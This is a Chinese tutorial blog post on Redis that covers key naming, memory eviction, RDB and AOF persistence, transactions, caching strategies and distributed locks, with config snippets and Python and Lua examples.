<p>有一个常见的面试题，<code>Hash</code>和<code>String</code>都可以用来存储对象，一般用那个来存储对象呢，使用<code>String</code>来存储对象，简单直观，但是它不支持局部更新，改一个字段需要覆盖这个字符串，适合一些整体读写、字段少的场景；<code>Hash</code>存储对象，他就支持局部更新，适合一些复杂对象的存储，比如高频更新字段。</p>
<h4 data-id="heading-8">3. redis基本命令</h4>
<p>因为<code>Redis</code>都是键值对的存储，所以他的方法也很简单，看下面这个例子：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 1. SET：设置一个字符串 key</span>
r.<span class="hljs-keyword">set</span>(<span class="hljs-string">"study:string"</span>, <span class="hljs-string">"hello"</span>)
​
<span class="hljs-meta"># 2. GET：读取这个 key</span>
print(<span class="hljs-string">"GET study:string ="</span>, r.<span class="hljs-keyword">get</span>(<span class="hljs-string">"study:string"</span>))  <span class="hljs-meta"># hello</span>
​
<span class="hljs-meta"># 3. INCR：自增一个数值型 key</span>
<span class="hljs-meta"># 如果这个 key 不存在，会从 0 开始加 1，变成 "1"</span>
r.delete(<span class="hljs-string">"study:count"</span>)  <span class="hljs-meta"># 为了方便测试，先删掉</span>
r.incr(<span class="hljs-string">"study:count"</span>)    <span class="hljs-meta"># 当前值 1</span>
r.incr(<span class="hljs-string">"study:count"</span>)    <span class="hljs-meta"># 当前值 2</span>
r.incr(<span class="hljs-string">"study:count"</span>, <span class="hljs-number">5</span>) <span class="hljs-meta"># 加 5 -&gt; 当前值 7</span>
print(<span class="hljs-string">"study:count ="</span>, r.<span class="hljs-keyword">get</span>(<span class="hljs-string">"study:count"</span>))  <span class="hljs-meta"># 7</span>
​
<span class="hljs-meta"># 4. EXPIRE：给 key 设置过期时间（单位：秒）</span>
r.expire(<span class="hljs-string">"study:count"</span>, <span class="hljs-number">5</span>)  <span class="hljs-meta"># 5 秒后过期</span>
</code></pre>
<p>读、写、自增和设置过期时间，都比较简单。</p>
<p>因为<code>Redis</code>都是键值对，没有表的概念，所以<code>Key</code>管理就成了问题，社区有一个约定的规范：<code>业务标识:模块名称:唯一标识[:子字段]</code>，比如<code>ecom:user:1001:name</code>，这就是电商业务：用户模块：用户id：用户名。还有一些额外的补充规范：</p>
<ol start="0">
<li>统一小写：避免大小写混乱，<code>User:1</code>和<code>user:1</code>是两个key</li>
<li>简洁且语义化：看到名称基本就能了解存储的内容</li>
<li>避免特殊字符：比如空格、换行符、下划线</li>
</ol>
<h2 data-id="heading-9">第二阶段：redis核心机制</h2>
<h4 data-id="heading-10">4.redis内存模型</h4>
<p><code>Redis</code>是一个内存数据库，大多数数据都保存才内存中。它的内存可以分为两大部分，核心内存和辅助内存。其中核心内存存储的就是我们常用的键值对，也就是<code>key</code>内存和<code>value</code>内存，存储的都是我们所用到的数据；辅助内存放的都是非业务数据，就是<code>Redis</code>运行所需的额外内存，比如一些过期字典、进程本身的开销等。</p>
<p><code>Redis</code>有一套完善的内存管理机制，主要有这么几步</p>
<ol start="0">
<li>基于<code>jemalloc</code>内存分配，将内存划分为不同大小的内存页，比如8B，16B，32B等，分配时匹配最接近的页，减少碎片；线程缓存，减少锁竞争，提升分配效率</li>
<li>内存回收：内存回收主要有两种，惰性删除和定期删除。惰性删除指的是访问key时检查是否过期，过期了就删除；定期删除，每100ms随机抽查过期的key，去删除已经过期的，但是这里有个问题，如果key过期了，但是没有被抽查到呢，为啥不扫描全量的key呢，这就是一个平衡了，全量扫描需要占用大量的CPU，会影响到业务的，这个就叫做延迟回收，也就是说可能一时半会回收不了，但是终归会被回收。</li>
</ol>
<p><code>Redis</code>的内存处理机制天然就有一种滞后性，可能就会出现内存满了的情况，这里的内存满了，并不是设置某个key的value大小超过512M，而是<code>Redis</code>进程占用的内存满了，这里的满有两个意思：主动设置的<code>maxmemory</code>，这个在生产环境上是必须要设置的</p>
<pre><code class="hljs language-bash" lang="bash">maxmemory 4GB  <span class="hljs-comment"># 限制 Redis 最大使用内存为 4GB</span>
</code></pre>
<p>还有一种满就是，如果不设置这个最大值，<code>Redis</code>就会无限制的占用服务器的物理内存，直到耗尽服务器所有可用的物理内存，这个时候操作系统会将<code>Redis</code>的内存数据交换到磁盘的swap分区，这个是磁盘模拟的内存，速度巨慢，最终导致<code>Redis</code>性能暴跌，也可能因为服务器内存耗尽而被系统杀死。</p>
<p>当内存满了后，<code>Redis</code>也有一套内存淘汰策略来处理这种情况，当<code>Redis</code>占用的内存超过设置的<code>maxmemory</code>后，然后再去执行写操作，就会去触发我们的内存淘汰策略，主要有这么几种策略：</p>
<ol start="0">
<li>
<p>LRU</p>
<p>最近最少使用，就是淘汰那些最近访问次数最少的key，标准的LRU需要维护一个访问时间链表，内存和cpu开销大，<code>Redis</code>实现的是近似LRU：维护一个候选池，触发淘汰时，从目标范围随机抽取key，也就是触发淘汰时，随机抽取一批key，然后比一比谁的访问时间最远，然后就淘汰它。</p>
</li>
<li>
<p>LFU</p>
<p>优先淘汰访问频率最低的key，<code>Redis</code>实现的LFU并不是简单的访问次数统计，而是通过概率递增的访问计数+时间衰减机制来近似的反应key的长期访问价值；在触发淘汰时，在通过随机采样的方式选择访问评率最低的key去淘汰。</p>
</li>
</ol>
<p>当内存满了后，再去对数据库做读写操作，读的操作没有影响，但是在触发写的操作时，如果内存满了，会先根据<code>maxmemory-policy</code>设置的内存淘汰策略，在写操作触发的同时根据LFU、LRU去更新内存，直到内存会到安全区；如果内存淘汰策略味为<code>noeviction</code>或者无法淘汰，直接回报错。</p>
<h4 data-id="heading-11">5.持久化机制</h4>
<p>前面也提到了，<code>Redis</code>是一种基于内存的键值数据库，内存的特性就是在服务器重启后会全部丢失，这就需要将数据做持久化，即使服务器重启了，也可以从磁盘中恢复数据至内存。</p>
<p><code>Redis</code>提供了两种核心的持久化方式：RDB和AOF，快照持久化和追加文件持久化，接下来挨个介绍下：</p>
<h6 data-id="heading-12">快照持久化</h6>
<p>RDB是定时对<code>Redis</code>内存中的全量数据做一次拍照，生成一个压缩的二进制文件，比如<code>dump.rdb</code>，保存到磁盘的指定目录。<code>Redis</code>重启时直接加载这个二进制文件，将数据恢复到内存中。</p>
<p>RDB有手动触发和自动触发两种方式：手动触发可以使用<code>save</code>来同步触发，同步触发会阻塞主进程，直到RDB文件生成完成，异步触发通过<code>bgsave</code>来触发，<code>Redis</code>会fork一个子进程来执行RDB文件的生成，主进程会继续处理客户端的请求；自动触发是在配置文件<code>redis.conf</code>中通过快照规则来配置的，满足条件就会自动执行<code>bgsave</code></p>
<pre><code class="hljs language-bash" lang="bash">save 900 1      <span class="hljs-comment"># 900 秒内至少 1 次写</span>
save 300 10     <span class="hljs-comment"># 300 秒内至少 10 次写</span>
save 60 10000   <span class="hljs-comment"># 60 秒内至少 10000 次写</span>
</code></pre>
<p>这里就是自动触发RDB的规则：满足其中的任意条件就会触发一次，比如60s内写一次、300s内写10次等。</p>
<p>RDB优点就在于性能开销小，生成RDB由子进程负责，主进程仅做fork操作，几乎不影响业务；二进制文件直接加载到内存速度也很快。但是缺点也很明显，RDB是定时快照，如果<code>Redis</code>意外崩溃，比如服务器断电，就会丢掉最后一次快照前到崩溃前的所有数据。</p>
<h6 data-id="heading-13">追加日志持久化</h6>
<p>AOF就是为了解决RDB数据库丢失而设计的持久化方式，就是将<code>Redis</code>的操作日志按照顺序记录下来，重启后通过重放AOF文件中所有的写命令去恢复内存数据。默认是关闭的，需要<code>appendonly yes</code>命令来手动重启。</p>
<p>AOF的相关配置在<code>redis.conf</code>文件中</p>
<pre><code class="hljs language-bash" lang="bash">appendonly <span class="hljs-built_in">yes</span> <span class="hljs-comment"># 开启AOF（默认no，关闭）</span>
appendfilename <span class="hljs-string">"appendonly.aof"</span> <span class="hljs-comment"># AOF文件名，默认保存在Redis工作目录</span>
<span class="hljs-built_in">dir</span> ./ <span class="hljs-comment"># 持久化文件（RDB/AOF）的保存目录，默认是Redis启动目录</span>
</code></pre>
<p>AOF主要分为三个步骤：</p>
<ol start="0">
<li>
<p>命令追加</p>
<p><code>Redis</code>执行完一个写命令后，会将该命令按照协议追加到内存中的AOF缓冲区，避免直接写入磁盘，减少IO开销</p>
</li>
<li>
<p>文件写入</p>
<p><code>Redis</code>会定期将AOF缓冲区的数据写入到内核页缓存，这个操作是调用操作系统的write方法，属于异步操作，不会阻塞主线程。</p>
</li>
<li>
<p>文件同步</p>
<p>将内核页缓存中的AOF数据写到测盘中，这个是调用的操作系统的同步方法，会阻塞主线程的，直到刷盘完成。</p>
<p>将AOF缓冲区中的命令刷到磁盘的AOF文件中，有三种策略：</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># appendfsync 有三个取值：</span>
appendfsync always  <span class="hljs-comment"># 每次写命令都立即刷盘（同步），数据最安全，性能最差</span>
appendfsync everysec<span class="hljs-comment"># 每秒刷盘一次（默认值），平衡数据安全和性能</span>
appendfsync <span class="hljs-keyword">no</span>      <span class="hljs-comment"># 由操作系统决定何时刷盘，性能最好，数据丢失风险最高</span>
</code></pre>
</li>
</ol>
<p>由于AOF是日志追加的形式，会产生大量的中间态，比如<code>set key 1</code> → <code>set key 2</code> → <code>set key 3</code> ，这种中间态其实是没有意义的，还会导致AOF文件变得很大，这就需要AOF重写机制了，重写就是遍历内存中的所有的数据，根据当前的键值对生成一套最简的写命令集来替换原有的AOF文件，重写的触发也分为手动触发和自动触发：手动触发需要执行<code>bgrewriteaof</code>命令；自动触发是通过配置文件，当文件的体积增长到达阙值时，自动触发<code>`bgrewriteaof</code>：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">auto</span>-aof-rewrite-min-size <span class="hljs-number">64</span>mb  # AOF文件的最小体积，低于这个值不触发重写（默认<span class="hljs-number">64</span>mb）
<span class="hljs-keyword">auto</span>-aof-rewrite-percentage <span class="hljs-number">100</span> # 重写触发的百分比，指当前AOF文件体积比上一次重写后的体积增长了多少（默认<span class="hljs-number">100</span>%）
</code></pre>
<p>AOF的优点就是，可以通过刷盘策略来控制数据丢失的风险，默认的<code>everysec</code>仅丢失1s的数据，<code>alway</code>几乎无丢失；缺点就是AOF文件体积较大，恢复数据时加载较慢。</p>
<h6 data-id="heading-14">混合持久化</h6>
<p>RDB和AOF单独使用都各有优缺点，在<code>Redis 4.0</code>之后，引入了混合持久化机制，融合恶RDB和AOF的优点，成为了目前生产环境的首选方案。</p>
<p>在<code>redis.conf</code>配置文件中开启混合持久化：</p>
<pre><code class="hljs language-bash" lang="bash">aof-use-rdb-preamble <span class="hljs-built_in">yes</span>  <span class="hljs-comment"># 开启混合持久化（Redis 4.0+，默认no；Redis 6.0+ 部分版本默认yes）</span>
</code></pre>
<p>开启后，AOF文件就不再是纯文本了，头部就成了RDB格式的全量数据快照，也就是二进制文件，尾部是AOF格式写的增量命令，记录从生成RDB快照到当前的所有写命令，是纯文本。</p>
<p>其工作流程主要有这么几个步骤：</p>
<p>当AOF触发重写时，</p>
<ol start="0">
<li>redis主进程进入fork子进程，执行AOF重写</li>
<li>子进程首先将内存中的全量数据以RDB格式写入到临时的AOF文件头部</li>
<li>子进程完成RDB写入后，主进程将AOF重写缓冲区中所有的增量写命令，以AOF格式写入到临时的AOF文件尾部</li>
<li>主进程用临时AOF文件替换掉旧的AOF文件，完成混合持久化的重写。</li>
</ol>
<p>混合持久化的优点就在于加载速度快，数据丢失风险小，而且文件的体积也不会很大。</p>
<p>下面推荐一个常见的生产环境的配置，开启混合持久化+RBD默认自动快照：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ===================== RDB 核心配置 =====================</span>
save 900 1
save 300 10
save 60 10000
rdbcompression <span class="hljs-built_in">yes</span>  <span class="hljs-comment"># 开启RDB压缩</span>
dbfilename dump.rdb <span class="hljs-comment"># RDB文件名</span>
<span class="hljs-built_in">dir</span> ./              <span class="hljs-comment"># 持久化文件存储目录（建议修改为独立的磁盘目录）</span>
​
<span class="hljs-comment"># ===================== AOF 核心配置 =====================</span>
appendonly <span class="hljs-built_in">yes</span>      <span class="hljs-comment"># 开启AOF（混合持久化的前提）</span>
appendfilename <span class="hljs-string">"appendonly.aof"</span> <span class="hljs-comment"># AOF文件名</span>
appendfsync everysec <span class="hljs-comment"># 刷盘策略，生产首选</span>
auto-aof-rewrite-min-size 64mb <span class="hljs-comment"># AOF重写最小体积</span>
auto-aof-rewrite-percentage 100 <span class="hljs-comment"># AOF重写增长百分比</span>
aof-use-rdb-preamble <span class="hljs-built_in">yes</span> <span class="hljs-comment"># 开启混合持久化（Redis 4.0+）</span>
aof-load-truncated <span class="hljs-built_in">yes</span> <span class="hljs-comment"># 加载AOF时，若尾部损坏则忽略，继续加载（默认yes）</span>
</code></pre>
<h4 data-id="heading-15">6. redis事务</h4>
<p><code>Redis</code>事务就是提供一种机制，将多个<code>Redis</code>命令打包成一个执行单元，保证这个单元内的命令会按照顺序、无中断的执行，同时支持对命令执行结果的统一处理，解决多命令批量执行的原子性需求。</p>
<p><code>Redis</code>事务只依赖五个命令：</p>
<ol start="0">
<li>MULTI 标记事务开始，后续所有的命令都会加入到事务队列中</li>
<li>EXEC 执行事务队列中的所有命令，执行完成后结束事务，返回所有命令的执行结果</li>
<li>DISCARD 放弃事务队列中的所有命令，清空队列结束事务，回到正常的执行模式</li>
<li>WATCH KEY 对key加乐观锁，监控key是否修改，必须在<code>MULTI</code>之前修改</li>
<li>UNWATCH 取消所有被watch监控的key，事务取消或者执行后会自动执行</li>
</ol>
<p>看下这个最基础的实务流程：</p>
<pre><code class="hljs language-sql" lang="sql">MULTI
<span class="hljs-keyword">SET</span> balance <span class="hljs-number">100</span>
INCR balance
<span class="hljs-keyword">EXEC</span>
</code></pre>
<p>执行到<code>MULTI</code>时，会进入事务状态，后续的<code>SET</code>、<code>INCR</code>会被放入到一个事务队列中，直行到<code>EXEC</code>时才会执行队列中的所有的命令。</p>
<p>传统的关系型数据库事务严格遵循<code>ACID</code>原则，原子性、一致性、隔离性和持久性，但是<code>Redis</code>事务为了极致的性能，并不是完全遵循ACID原则。接下来介绍下他的区别：</p>
<ol start="0">
<li>
<p>原子性</p>
<p>原子性的定义就是事务中的所有的操作，要么全部执行，要么全部不执行，不会出现部分执行的情况，而<code>Redis</code>事务的原子性分为两种情况：</p>
<p>1） 事务入队前出错，全不执行：当在MULTI后，EXEC前出现语法错误，<code>Redis</code>会立即返回错误，执行EXEC时会直接放弃整个事务</p>
<p>2） 执行事务中出现错误，部分执行，没有回滚，命令入队时只会做语法检查，不会做逻辑检查，执行时如果出现了运行错误，<code>Redis</code>就会跳过这个命令，继续执行后续的命令，而且不会对已经执行的命令做回滚</p>
<p>不支持回滚主要也是从性能考量，实现回滚需要记录每个命令的逆操作，比如SET的操作就是恢复原值，这个会增加<code>Redis</code>内核的复杂度，牺牲执行的性能。</p>
</li>
<li>
<p>一致性</p>
<p>一致性就是事务执行的前后，数据库的状态始终保持合法，不会因为事务的执行而出现脏数据。<code>Redis</code>事务可以在所有的异常情况下，比如入队错误、执行错误、宕机，都可以保证数据的一致性。</p>
</li>
<li>
<p>隔离性</p>
<p>隔离就是在多个事务并发执行时，一个事务的执行不会被其他的事务干扰，各个事务之间相互隔离。<code>Redis</code>是单线程处理客户端请求的，这就会导致事务的执行会按照队列中的顺序连续执行，不会被其他的命令打断</p>
</li>
<li>
<p>持久性</p>
<p>持久性是指事务执行成功后，对数据的修改会被永久的保存到磁盘中，不会应为宕机而丢失。<code>Redis</code>事务本身并不保证持久性，持久性是由<code>Redis</code>的持久化机制来实现的，前面也介绍过</p>
</li>
</ol>
<p>接下来写一个小的demo，利用watch来控制库存防止超卖</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_purchase</span>(<span class="hljs-params">stock_key: <span class="hljs-built_in">str</span>, user: <span class="hljs-built_in">str</span>, qty: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
    <span class="hljs-string">"""使用 WATCH + 事务进行扣库存，避免超卖。
​
    乐观锁思路：
    1. WATCH 库存 key，监听是否被别人改动；
    2. 读当前库存，判断是否足够；
    3. 使用 MULTI 开启事务，扣减库存；
    4. EXEC 提交，如果在这期间库存被别人改了，EXEC 会失败（抛 WatchError），然后重试。
    """</span>
​
    <span class="hljs-keyword">with</span> r.pipeline() <span class="hljs-keyword">as</span> pipe:
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># 1. 监听库存 key</span>
                pipe.watch(stock_key)
​
                <span class="hljs-comment"># 2. 读取当前库存</span>
                current = pipe.get(stock_key)
                <span class="hljs-keyword">if</span> current <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{user}</span>: 商品不存在"</span>)
                    pipe.unwatch()
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
​
                current = <span class="hljs-built_in">int</span>(current)
                <span class="hljs-keyword">if</span> current &lt; qty:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{user}</span>: 库存不足，当前库存=<span class="hljs-subst">{current}</span>"</span>)
                    pipe.unwatch()
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
​
                <span class="hljs-comment"># 3. 开启事务，扣减库存</span>
                pipe.multi()
                pipe.decrby(stock_key, qty)
​
                <span class="hljs-comment"># 4. 提交事务</span>
                pipe.execute()
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{user}</span>: 抢购成功，扣减 <span class="hljs-subst">{qty}</span>，扣减前库存=<span class="hljs-subst">{current}</span>"</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
​
            <span class="hljs-keyword">except</span> redis.WatchError:
                <span class="hljs-comment"># 在 WATCH 之后、EXEC 之前，有其他客户端修改了 stock_key，</span>
                <span class="hljs-comment"># 这次事务会失败，需要重试。</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{user}</span>: 检测到并发冲突，重试中..."</span>)
                <span class="hljs-keyword">continue</span>
</code></pre>
<h2 data-id="heading-16">第三阶段：高并发&amp;分布式</h2>
<h4 data-id="heading-17">7. 缓存模式与一致性</h4>
<p><code>Redis</code>作为缓存的核心亮点就在于其高速的读写操作，来降低传统数据库的压力，基于此<code>Redis</code>推出了有大概四种主流的缓存策略，来将缓存融入业务读写流程，同时保证缓存与数据库的一致性。接下来挨个介绍下：</p>
<ol start="0">
<li>
<p>缓存穿透模式</p>
<p>缓存和数据库分离，业务代码主动管理缓存和数据库的交互。在读操作时，先查询缓存，如果命中就直接返回，如果没有就查询数据库，同时将数据库的结果写入缓存；在写操作时，先更新数据库，在删除缓存。</p>
<p>这种模式适合绝大多数的生产场景，是<code>Redis</code>作为缓存的首选模式。优点就是简单易实现，缺点就是需要额外处理缓存穿透、击穿雪崩等场景。</p>
</li>
<li>
<p>读写穿透</p>
<p>业务代码只和缓存交互，不直接操作数据库，缓存作为中间层，主动管理数据库的读写。在读操作时，先查询缓存，如果命中就直接返回，未命中就查询数据库，将结果写入缓存，然后返回；写操作就更新缓存，然后再去更新数据库。</p>
<p>这种模式的特点就是业务代码只专注于业务，数据库由缓存层来处理，简化了业务代码逻辑，缺点就是缓存层需要额外的代码开发，而且不支持新增数据，因为新增数据要先执行读操作，才能存入缓存，不太符合常规的业务逻辑。</p>
</li>
<li>
<p>写穿模式</p>
<p>这种模式是读写穿模式的增强版，支持新增、更新数据。在读操作时，和读写穿透模式一样，命中返回，未命中查库更新缓存；写操作时和新增数据时，缓存同步更新数据库，然后返回给业务。</p>
<p>这种模式的特点在于写操作时，缓存和数据库同步更新，缓存和数据库有着非常强的一致性，常用于支付业务的核心数据缓存。</p>
</li>
<li>
<p>写回模式</p>
<p>这种模式是写穿模式的异步版，差异就在与写操作时是异步的。在读操作时，和读写穿透、写穿模式一样，命中就返回，未命中查库更新缓存后返回；在新增和更新的写操作时，缓存立即返回，然后异步去更新数据。</p>
<p>这种模式适合并发高、一致性要求较低的场景，比如日志缓存等。</p>
</li>
</ol>
<p>生产模式中比较常用和推荐的，就是缓存穿透模式，然后这种模式在一致性的问题上需要额外处理。比如有这么几个场景：</p>
<ol start="0">
<li>在写操作时，正常的流程是，更新数据库，然后删除缓存，更新缓存需要下次读的时候去查库更新。但是如果更新数据库后，遇到宕机或者网络异常，就会导致缓存未及时删除，这就出现了脏数据，知道缓存过期。这也是最常见的不一致场景，属于操作中断导致的缓存未更新。</li>
<li>在并发的场景下，客户端A和客户端B同时分别执行读写操作，A读操作时，缓存未命中就会去查库，B写操作时更新完数据库后，回去删除缓存，这时如果读操作的写缓存的动作晚于写操作的删除动作，就会产生数据库与缓存的不一致场景，数据库是新的数据，缓存中是旧的脏数据。</li>
</ol>
<p>在数据一致性上有这样一个原则，最终数据一致性即可，而非强制一致性。<code>Redis</code>作为缓存，是没有办法实现和数据库的强一致性。因为缓存和数据库属于两个独立的存储系统，非要强一致性就需要加锁，这就会牺牲<code>Redis</code>的高性能，而且在实际业务中，带短暂的不一致，对于用户来说并没有感知的。</p>
<p>在缓存穿透模式中，有这么几个方案可以解决缓存与数据库的一致性问题</p>
<ol start="0">
<li>
<p>单实例低并发场景，在一些后台管理，小流量业务汇中，可以直接使用缓存穿透模式的基础逻辑，即读操作时先缓存后数据库，如果不存在就写一个缓存空值，加上过期时间；在写操作时，先更新数据库，在删除缓存，给所有的缓存加上过期时间。</p>
<p>这里设置缓存空值，就是为了防止缓存杀手-穿透，比如查询一个数据库没有的值，这就会直接访问数据库，万一遇到恶意访问的脚本，就会导致数据库压力；而设置一个空值，在过期时间内，他是一个有效的缓存，虽然没有值，但减轻了数据库的压力，算是为了系统的稳定性做了一次兜底。</p>
</li>
<li>
<p>单实例高并发，在电商的商品详情、商品秒杀库存业务中，在基础方案上增加延迟删除缓存，来解决<code>读操作写缓存晚于写操作删缓存</code>的问题。 流程就是在写操作执行更新数据库后，延迟N毫秒删除缓存，让读操作查库、写缓存的动作先完成。</p>
</li>
</ol>
<p>还有一个常见的八股文：缓存的三大杀手，穿透、击穿和雪崩。</p>
<ol start="0">
<li>
<p>穿透，在前面的穿透模式时介绍过了，就是查询一些数据库中不存在的值时，每次都会去查询数据库，导致缓存失效，数据库增加额外的压力。解决方案有下面几种：</p>
<p>1）设置空值，前面也介绍过，这是最简通用的方案</p>
<p>2）布隆过滤器，提前将数据库中所有的合法key存入过滤器，请求先过过滤器，判定不存在就会直接拒绝，就走不到缓存和数据库了</p>
<p>3）IP/接口 限流熔断，对于穿透请求高频的IP限流，对查询接口做熔断保护。这里的限流就是限制单位时间内允许请求的数量，比如单位时间内某个IP大量请求不存在的ID，加了限流之后直接回报错429错误码，就走不到缓存、数据库了；熔断就是当下游服务器持续失败或者过慢时，暂时切断请求，防止雪崩扩散。</p>
</li>
<li>
<p>击穿，某个极高的热点key，恰好过期或者被删除，此时大量并发请求同时访问该key，全部缓存未命中，所有的请求都会访问到数据库。这里的解决方案有：互斥锁串行重建缓存，热点key永不过期，热点key主动更新</p>
</li>
<li>
<p>雪崩，大量缓存key在同一时间集体过期，或者<code>Redis</code>缓存集体宕机，导致请求绕过缓存直接访问数据库，导致数据库负载瞬间爆表，引发整个服务链路雪崩。解决方案有：过期时间随机化，<code>Redis</code>集群高可用，服务限流、熔断、降级。</p>
</li>
</ol>
<h4 data-id="heading-18">8. 分布式锁</h4>
<p>在分布式、微服务架构中，一个服务会运行在多台机器上，这就是多进程的概念，多台机器会共享一个资源，这个时候python的线程锁就会失效，因为这些锁的作用范围是当前进程的内存，只能管自己进程内的线程。这时就需要分布式锁了，分布式锁就是跨进程、跨服务的锁，要保证多个进程对共享资源的互斥访问。</p>
<p>分布式锁有四个核心的特性：</p>
<ol>
<li>互斥性，同一时间只有一个客户端持有锁，其他的客户端必须等待</li>
<li>安全性，锁只能被其持有者释放，不能被其他客户端误删</li>
<li>避免死锁，即使持有锁的客户端崩溃、中断，也可以在一定时间后自动释放</li>
<li>可用性，<code>Redis</code>集群环境下，锁服务不能单点故障，要保证大部分节点可用</li>
</ol>
<p><code>Redis</code>做分布式锁的优点，就在于其性能极高，获取、释放锁都是毫秒级，而且部署也比较简单。</p>
<p>接下来介绍下<code>Redis</code>单节点分布式锁的几个命令：</p>
<ol>
<li>key 锁的唯一标识，比如要给ID=111的资源加锁</li>
<li>value 客户端的唯一标识，保证锁只能被持有者释放</li>
<li>NX 全程<code>Not Exist</code>，只有当key不存在时才会设置成功</li>
<li>EX/PX 设置的过期时间，EX单位是秒，PX单位是毫秒</li>
<li>timeout 锁的过期时间，避免死锁</li>
</ol>
<p>比如这行代码：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SET</span> lock:<span class="hljs-keyword">order</span>:<span class="hljs-number">123</span> uuid:<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span> NX EX <span class="hljs-number">30</span>
</code></pre>
<p>就表明给资源key为lock:order:123的资源加锁，锁的持有者是uuid:192.168.1.100，30秒后过期</p>
<p>而释放锁，就回到刚刚的安全性了，必须只有锁的持有客户端才可以释放。流程就是先判断加锁的客户端是不是自己，如果是才可以去释放，看下相关的Iua脚本：</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'GET'</span>, KEYS[<span class="hljs-number">1</span>]) == ARGV[<span class="hljs-number">1</span>] <span class="hljs-keyword">then</span>
    <span class="hljs-keyword">return</span> redis.call(<span class="hljs-string">'DEL'</span>, KEYS[<span class="hljs-number">1</span>])  <span class="hljs-comment">-- 标识匹配，删除锁</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment">-- 标识不匹配，不做任何操作</span>
<span class="hljs-keyword">end</span>
</code></pre>
<p>之前写过一个卖票的函数，就是使用<code>Redis</code>的分布式锁来控制库存，防止超卖：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">sell_one_with_lock</span>(<span class="hljs-params">r: Redis, window_name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
    <span class="hljs-string">"""使用 Redis 分布式锁保护“检查+扣减”关键区，成功卖出返回 True，售罄或失败返回 False。"""</span>
    lock = r.lock(LOCK_KEY, timeout=<span class="hljs-number">5</span>, blocking_timeout=<span class="hljs-number">1</span>)  <span class="hljs-comment"># 超时时间与获取等待时间可调</span>
    acquired = <span class="hljs-keyword">await</span> lock.acquire(blocking=<span class="hljs-literal">True</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> acquired:
        <span class="hljs-comment"># 未拿到锁，视为本次卖票失败（可重试）</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 关键区：读取剩余、判定、扣减</span>
        remaining_str = <span class="hljs-keyword">await</span> r.get(TICKET_KEY)
        remaining = <span class="hljs-built_in">int</span>(remaining_str) <span class="hljs-keyword">if</span> remaining_str <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
        <span class="hljs-keyword">if</span> remaining &lt;= <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-comment"># 扣减一张（原子自减命令）</span>
        <span class="hljs-keyword">await</span> r.decr(TICKET_KEY)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">finally</span>:
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">await</span> lock.release()
        <span class="hljs-keyword">except</span> Exception:
            <span class="hljs-comment"># 若锁已过期或其他异常，忽略释放错误</span>
            <span class="hljs-keyword">pass</span>
​
</code></pre>
<p>代码第一行就创建了一个分布式锁，传入了一个过期时间防止死锁，<code>lock.acquire</code>是真正的加锁步骤。之前看到这里有个疑惑：每次调用这个方法，都会创建一个分布式锁，如何保证对一个资源加锁，在创建锁的时候传入了<code>LOCK_KEY</code>，这个就是要加锁的key，也就是要加锁的资源，这个方法每次执行都会创建一个锁，但是<code>lock.acquire</code>在资源没有释放的时候，返回的是false，也就是会走到<code>if not</code>这里的。</p>
<p>其实后续章节还有单点故障，主从、哨兵、 <code>Redlock</code>、 扩容、数据分片等，觉得分布式、缓存还需要消化下，后面就不在深入了，打算进入实战环节了，后续打算设计三个实战项目来进一步深入的学习下。</p>
<p>三个实战项目分别是</p>
<ol>
<li>信息查询系统，使用<code>MySQL</code>存储用户信息，<code>Redis</code>作为缓存，巩固下前面学习的缓存模式，同时加上压测环节，通过QPS，响应时间更加直观的了解缓存的意义</li>
<li>抢票系统，学习下Lua脚本，</li>
<li>秒杀系统，学习下高并发处理、限流、防超卖策略</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一天一个开源项目（第13篇）：Tunnelto - 用Rust打造的高性能内网穿透工具]]></title>    <link>https://juejin.cn/post/7603221478473351210</link>    <guid>https://juejin.cn/post/7603221478473351210</guid>    <pubDate>2026-02-05T12:00:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603221478473351210" 